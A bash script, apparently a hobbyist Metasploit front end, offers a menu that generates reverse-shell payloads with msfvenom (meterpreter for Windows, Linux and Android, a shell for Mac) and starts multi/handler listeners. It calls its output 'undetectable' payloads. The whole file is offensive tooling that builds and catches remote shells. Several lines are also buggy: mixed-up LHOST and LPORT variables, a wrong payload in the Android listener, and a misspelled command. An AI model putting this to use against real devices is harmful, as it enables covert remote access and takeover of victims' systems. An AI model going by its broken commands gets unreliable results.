#!/bin/bash
# etc etc etc
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be super user or root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;36m:******************************************************"
echo -e "\E[1;36m:##############\e[97mMetasploit service started \E[1;36m##################"
echo -e "\E[1;36m:##### \e[97mScripts and payloads saved to ~/Desktop/temp/ \E[1;36m#######"
echo -e "\E[1;36m:******************************************************"
tput sgr0
read -p "Press [Enter] key to Continue..."
#uservar= ifconfig | sed -e '1,/wlan0/d' | head -n 1 | xargs | cut -d " " -f 2
 
clear

while(true)
do
	echo -e "\E[1;36m:::::::::::::: \e[97mMetasploit script \E[1;36m:::::::::::::::"
	echo -e "\e[97m       this tool is used to create undetectable 
		PALOADS for any OS
						by \e[31m~sam~ "
	tput sgr0                                       # 
	echo -e "\e[31m_________________________[ \e[90mSELECT AN OPTION TO BEGIN \e[31m]"
	echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
	echo -e "\E[1;33m:::\e[95m[1] \e[89mPayload       \e[97m [Create a payload with msvenom]  \E[1;33m"
	tput sgr0                               # Reset colors to "normal."
	echo -e "\E[1;33m:::\e[95m[2] \e[89mListen    \e[97m [Start a multi handler]   \E[1;33m"
	tput sgr0
	echo -e "\E[1;33m:::\e[95m[3] \e[89mExploit       \e[97m [Drop into msfconsole]\E[1;33m"
	tput sgr0
	#echo -e "\E[1;33m:::\e[95m[4] \e[89mPersistence        \e[97m [Forge a Persistence script] \E[1;33m"
	#tput sgr0
	echo -e "\E[1;33m:::\e[95m[4] \e[89mArmitage       \e[97m [Launch Armitage GUI]  \E[1;33m"
	tput sgr0
	echo -e "\E[1;33m:::\e[95m[5] \e[89mExit       \e[97m [Exit]  \E[1;33m"
	tput sgr0                               # Reset attributes.
	echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
	echo -e "\e[97m~~~~~~~~~~~~~~~~~~ \e[31mGuided by Jyoti mam \e[97m~~~~~~~~~~~~~~~~~~~~~\e[31m"
	echo $uservar $userport
	tput sgr0


	read options

	case "$options" in
	# Note variable is quoted.

 	 "1" | "1" )
  	# Accept upper or lowercase input.
 	 echo -e "\E[1;35m::::: \e[97mLets Create a PAYLOAD\E[1;35m:::::"
	tput sgr0
	PS3='Enter your choice: '
	options=("Windows" 
		"Linux" 
		"Mac" 
		"Android" 
		"List_All" 
		"Back" 
		"Quit")
	select opt in "${options[@]}"
	do
		echo "your current wlan0 ip is:" 
		 userhost= ifconfig | sed -e '1,/wlan0/d' | head -n 1 | xargs | cut -d " " -f 2
		
		#userport=8080 
    case $opt in
        "Windows")
            read -p 'Set LHOST IP(your ip address): ' userhost; read -p 'Set LPORT(eg.8080): ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP(your ip address): ' userhost; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "\E[1;33m::::: \e[97mshell.elf saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP(your ip address): ' userhost; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userhost -f macho > ~/Desktop/temp/shell.macho
            echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP(your ip address): ' userhost; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/Desktop/temp\E[1;33m:::::"
            ;;  
        "List_All")
            xterm -e msvenom -l &
            ;;   
        "Back")
            echo "back to main window" && break
            
            ;;
        "Quit")
            exit
            ;;
        *) echo invalid option;;
    	esac
	done
 	;;

	  "2" | "2" )
	echo -e "\E[1;33m::::: \e[97mLets Create a LISTNER\E[1;33m:::::"
	tput sgr0
	PS3='Enter your choice: '
	options=("Windows" "Linux" "Mac" "Android" "List_All" "Back" "Quit")
	select opt in "${options[@]}"
	do
		 echo "your current wlan0 ip is:" 
		 userhost= ifconfig | sed -e '1,/wlan0/d' | head -n 1 | xargs | cut -d " " -f 2
	    case $opt in
	        "Windows")
	            touch ~/Desktop/temp/meterpreter.rc
	            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LHOST IP(your ip address): ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LPORT(eg.8080): ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "Linux")
            touch ~/Desktop/temp/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LHOST IP(your ip address): ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LPORT(eg.8080): ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_linux.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_linux.rc
            cat ~/Desktop/temp/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_linux.rc &
            exit
            ;;
        "Mac")
            touch ~/Desktop/temp/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LHOST IP(your ip address): ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LPORT(eg.8080): ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_mac.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_mac.rc
            cat ~/Desktop/temp/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_mac.rc &
            ;;
        "Android")
            touch ~/Desktop/temp/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LHOST IP(your ip address): ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LPORT(eg.8080): ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_droid.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_droid.rc
            cat ~/Desktop/temp/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
            ;;  
        "List_All")
            touch ~/Desktop/temp/payloads.rc
            echo show payloads > ~/Desktop/temp/payloads.rc
            cat ~/Desktop/temp/payloads.rc
            xterm -e msfconsole -r ~/Desktop/temp/payloads.rc &
            ;;
	"Back")
            echo "back to main window" && break
            
            ;;   
        "Quit")
            echo "Bye Bye" && break
            ;;
        *) echo invalid option;;
    esac
	done
	;;

	 "3" | "3" )
	  # Accept upper or lowercase input.
	  echo -e "\E[1;33m::::: \e[97mStarting Metasploit \E[1;33m:::::"
	  msfconsole
	  use exploit/multi/handler  

	;;


  

  "4" | "4" )
  # 
  echo -e "\E[1;33m::::: \e[97mArmitage Launcher \E[1;33m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;33m::::: \e[97mLaunching...\E[1;33m:::::"
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

	;;
	"5" | "5" )
  # 
  echo "good bye"&&break
	;;



          * )
   # Default option.      
   # 
   		echo
   		echo "Not yet in database."
   		echo "Bye Bye invalid option"
  		;;

	esac
done

	tput sgr0                               # Reset colors to "normal."

	echo

	exit 0
